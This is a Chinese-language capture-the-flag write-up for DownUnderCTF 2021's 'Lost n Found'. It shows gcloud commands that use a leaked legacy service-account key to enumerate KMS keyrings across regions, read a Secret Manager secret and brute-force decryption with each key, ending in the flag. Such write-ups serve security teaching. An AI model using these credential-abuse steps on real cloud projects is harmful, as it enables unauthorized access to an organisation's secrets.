# DownUnderCTF 2021 - Lost n Found

## 题目简述

题目提供一份遗留 Google Cloud 服务账号密钥，目标是在对应项目中扩大凭据泄露的影响。服务账号名为 `legacy-svc-account`；部署脚本为它配置了一个自定义 KMS 角色，允许列举密钥环、列举密钥并调用解密，同时还配置了 Secret Manager 的查看权限。真正的 flag 没有直接保存在可读文件中，而是先由区域 KMS 密钥加密，再以 Base64 文本形式存入 Secret Manager。

公开仓库中的真实私钥属于比赛基础设施遗留数据，复现时不应复制到 WP；只需使用题目当时下发的 `legacy.json`。

## 解题过程

先从服务账号 JSON 的 `project_id` 取得项目名，激活凭据并切换项目：

```bash
gcloud auth activate-service-account --key-file=legacy.json
gcloud config set project '<project-id>'
```

常规枚举只在 `global` 位置发现一个空密钥环。Cloud KMS 的密钥环与 location 绑定，只查询默认位置会漏掉区域资源，因此要遍历可用区域：

```bash
gcloud compute regions list --format='value(name)' > regions.txt
while read -r region; do
  gcloud kms keyrings list --location "$region"
done < regions.txt
```

在 `australia-southeast2` 中可以发现 `wardens-locks`，继续列举其中的密钥：

```bash
gcloud kms keys list \
  --keyring wardens-locks \
  --location australia-southeast2 \
  --format='value(name)'
```

题面把 *secretive* 作为提示。枚举 Secret Manager 后能找到 `unused_data`；比赛环境中的官方实测表明该账号可以读取其第 1 个版本：

```bash
gcloud secrets list
gcloud secrets versions list unused_data
gcloud secrets versions access 1 --secret unused_data > cipher.b64
base64 -d cipher.b64 > cipher.bin
```

这里需要区分源码和比赛环境：公开的 `setup.sh` 只展示了 `roles/secretmanager.viewer` 绑定，而官方解题记录确实成功读取了 payload。复现历史环境时应以实际 API 响应为准，不应据此推断当前 GCP 同名角色一定仍包含相同权限。

密文由 `wardens-locks` 中某一把对称密钥生成。逐个尝试解密，错误密钥会返回 `INVALID_ARGUMENT`，正确密钥会写出明文：

```bash
while read -r key; do
  name="${key##*/}"
  echo "Trying $name"
  if gcloud kms decrypt \
      --key "$name" \
      --keyring wardens-locks \
      --location australia-southeast2 \
      --ciphertext-file cipher.bin \
      --plaintext-file final.txt; then
    cat final.txt
    break
  fi
done < <(gcloud kms keys list \
  --keyring wardens-locks \
  --location australia-southeast2 \
  --format='value(name)')
```

`a-silver-key` 能成功解密，得到：

```text
DUCTF{its_time_to_clean_up_your_service_account_permissions!}
```

## 方法总结

本题是一条由遗留服务账号触发的云权限组合链：认证后先枚举能力，再跨 location 搜索 KMS 资源，从 Secret Manager 取得密文，最后滥用 `cloudkms.cryptoKeyVersions.useToDecrypt`。关键识别信号是“默认区域为空”并不表示项目中没有资源；KMS、Secret Manager 等控制面对象必须结合 location 和 IAM 权限逐层枚举。文档中还应避免保存真实服务账号私钥，并明确区分公开部署脚本与比赛时实际观测到的权限。
